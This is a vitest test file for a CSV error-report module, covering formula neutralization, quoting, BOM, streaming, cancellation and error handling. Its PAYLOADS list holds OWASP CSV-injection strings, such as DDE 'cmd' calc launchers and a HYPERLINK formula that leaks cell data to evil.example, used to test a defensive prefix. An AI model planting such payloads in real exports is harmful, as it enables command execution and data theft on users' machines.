import { describe, expect, it } from 'vitest'
import {
  CSV_BOM,
  csvField,
  csvLine,
  csvReport,
  csvReportAsync,
  csvReportStream,
  neutralizeFormula,
} from './report'

const cp = (code: number) => String.fromCodePoint(code)

// OWASP "CSV Injection" payloads and common variants.
const PAYLOADS = [
  '=1+1',
  "=cmd|' /C calc'!A0",
  '=HYPERLINK("http://evil.example/?leak="&A1,"Error details")',
  '=DDE("cmd";"/C calc";"!A0")',
  '+1+1',
  "+cmd|' /C calc'!A0",
  "-2+3+cmd|' /C calc'!A0",
  '-1+1',
  "@SUM(1+1)*cmd|' /C calc'!A0",
  '@A1',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  '=1+1\n',
  `${cp(0xff1d)}1+1`,
  `${cp(0xff0b)}1+1`,
  `${cp(0xff0d)}1+1`,
  `${cp(0xff20)}SUM(A1)`,
  ' =1+1',
  `${cp(0x00a0)}=1+1`,
  `${cp(0x200f)}=1+1`,
  `${cp(0xfeff)}+1`,
  `${cp(0x3000)}@A1`,
]

describe('neutralizeFormula', () => {
  it.each(PAYLOADS)('prefixes %j', (payload) => {
    expect(neutralizeFormula(payload)).toBe(`'${payload}`)
  })

  it.each([
    'P-000001',
    'فلتر زيت',
    '-5',
    '12.5',
    '-0.125',
    '0',
    '',
    'a=b',
    'x+y',
    "'quoted",
    'RUH-01',
  ])('leaves %j alone', (value) => {
    expect(neutralizeFormula(value)).toBe(value)
  })
})

describe('csvField and csvLine', () => {
  it('quotes every field and doubles inner quotes', () => {
    expect(csvField('abc')).toBe('"abc"')
    expect(csvField('say "hi"')).toBe('"say ""hi"""')
    expect(csvField('a,b')).toBe('"a,b"')
    expect(csvField('line1\nline2')).toBe('"line1\nline2"')
    expect(csvField(42)).toBe('"42"')
    expect(csvField(-3.5)).toBe('"-3.5"')
    expect(csvField(Number.NaN)).toBe('""')
    expect(csvField(true)).toBe('"true"')
    expect(csvField(null)).toBe('""')
    expect(csvField(undefined)).toBe('""')
  })

  it('neutralizes before quoting', () => {
    expect(csvField('=HYPERLINK("x")')).toBe('"\'=HYPERLINK(""x"")"')
    expect(csvField(`${cp(0xff1d)}1`)).toBe(`"'${cp(0xff1d)}1"`)
  })

  it('ends lines with CRLF', () => {
    expect(csvLine(['items.csv', 12, 'unit_cost', 'invalid_decimal', '1,5'])).toBe(
      '"items.csv","12","unit_cost","invalid_decimal","1,5"\r\n',
    )
  })
})

const HEADER = ['File', 'Row', 'Column', 'Code', 'Message', 'Value']
const ROWS = [
  ['items.csv', 2, 'item_code', 'required', 'A value is required.', ''],
  ['items.csv', 3, 'name_ar', 'too_long', 'Too long.', 'فلتر زيت'],
  ['items.csv', 4, 'unit_cost', 'invalid_decimal', 'Not a number.', '=1+1'],
]
const EXPECTED =
  `${CSV_BOM}"File","Row","Column","Code","Message","Value"\r\n` +
  '"items.csv","2","item_code","required","A value is required.",""\r\n' +
  '"items.csv","3","name_ar","too_long","Too long.","فلتر زيت"\r\n' +
  '"items.csv","4","unit_cost","invalid_decimal","Not a number.","\'=1+1"\r\n'

describe('csvReport', () => {
  it('writes the BOM, the header and every row', () => {
    expect([...csvReport(HEADER, ROWS)].join('')).toBe(EXPECTED)
    expect([...csvReport(HEADER, ROWS, { bom: false })].join('')).toBe(EXPECTED.slice(1))
    expect([...csvReport(HEADER, [])].join('')).toBe(EXPECTED.split('\r\n')[0] + '\r\n')
  })

  it('streams in pieces that end at line ends', () => {
    const pieces = [...csvReport(HEADER, ROWS, { pieceChars: 10 })]
    // The header rides with the first row.
    expect(pieces).toHaveLength(3)
    expect(pieces.every((piece) => piece.endsWith('\r\n'))).toBe(true)
    expect(pieces.join('')).toBe(EXPECTED)
  })

  it('reads rows lazily', () => {
    let produced = 0
    function* rows() {
      for (let row = 1; row <= 100_000; row += 1) {
        produced += 1
        yield ['demand_history/2026-01.csv', row, 'quantity', 'out_of_range', 'Too small.', '-1']
      }
    }
    const pieces = csvReport(HEADER, rows())
    pieces.next()
    expect(produced).toBeGreaterThan(0)
    expect(produced).toBeLessThan(100_000)
  })
})

describe('csvReportAsync and csvReportStream', () => {
  async function* asyncRows() {
    for (const row of ROWS) {
      await Promise.resolve()
      yield row
    }
  }

  it('writes the same text from async rows', async () => {
    const pieces: string[] = []
    for await (const piece of csvReportAsync(HEADER, asyncRows(), { pieceChars: 1 })) {
      pieces.push(piece)
    }
    expect(pieces.join('')).toBe(EXPECTED)
  })

  it('encodes UTF-8 bytes for a Response body, BOM first', async () => {
    const response = new Response(csvReportStream(HEADER, asyncRows()))
    const bytes = new Uint8Array(await response.arrayBuffer())
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf])
    expect(new TextDecoder('utf-8', { ignoreBOM: true }).decode(bytes)).toBe(EXPECTED)
  })

  it('stops the source when the download is cancelled', async () => {
    let finished = false
    async function* endless() {
      try {
        for (let row = 1; ; row += 1) yield ['f.csv', row, 'c', 'required', 'm', '']
      } finally {
        finished = true
      }
    }
    const reader = csvReportStream(HEADER, endless(), { pieceChars: 100 }).getReader()
    await reader.read()
    await reader.cancel()
    expect(finished).toBe(true)
  })

  it('errors the stream when the source fails', async () => {
    async function* failing(): AsyncGenerator<string[]> {
      yield ['f.csv', '1', 'c', 'required', 'm', '']
      throw new Error('database went away')
    }
    const response = new Response(csvReportStream(HEADER, failing(), { pieceChars: 1 }))
    await expect(response.text()).rejects.toThrow('database went away')
  })
})
